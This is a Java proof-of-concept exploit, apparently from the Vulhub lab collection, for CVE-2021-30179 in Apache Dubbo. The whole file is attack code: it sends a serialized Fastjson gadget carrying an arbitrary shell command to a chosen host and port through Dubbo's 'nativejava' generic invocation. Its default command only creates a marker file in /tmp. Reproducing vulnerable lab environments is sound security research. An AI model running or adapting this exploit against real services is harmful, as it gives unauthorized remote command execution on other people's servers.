package org.vulhub.poc;

import org.apache.dubbo.config.ApplicationConfig;
import org.apache.dubbo.config.ReferenceConfig;
import org.apache.dubbo.config.RegistryConfig;
import org.apache.dubbo.rpc.service.GenericService;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;

public class CVE202130179 {
    public static void main(String[] args) throws Exception {
        String[] positional = PocUtils.positional(args);
        if (positional.length < 2 || positional.length > 3) {
            System.err.println("Usage: CVE-2021-30179 <host> <port> [command]");
            System.err.println("Example: CVE-2021-30179 127.0.0.1 20880 \"touch /tmp/success-nativejava\"");
            System.exit(1);
        }

        String host = positional[0];
        String port = positional[1];
        String command = positional.length == 3 ? positional[2] : "touch /tmp/success-nativejava";

        ReferenceConfig<GenericService> reference = new ReferenceConfig<>();
        reference.setApplication(new ApplicationConfig("generic-nativejava-poc"));
        reference.setRegistry(new RegistryConfig("N/A"));
        reference.setInterface("org.vulhub.api.CalcService");
        reference.setUrl("dubbo://" + host + ":" + port);
        reference.setGeneric("nativejava");

        byte[] payload = serialize(FastjsonGadget.create(command));

        GenericService genericService = reference.get();
        genericService.$invoke("echo", new String[]{"java.lang.Object"}, new Object[]{payload});

        System.out.println("Payload sent to " + host + ":" + port + " with generic nativejava serialization");
    }

    private static byte[] serialize(Object object) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (ObjectOutputStream objectOutput = new ObjectOutputStream(out)) {
            objectOutput.writeObject(object);
        }
        return out.toByteArray();
    }
}
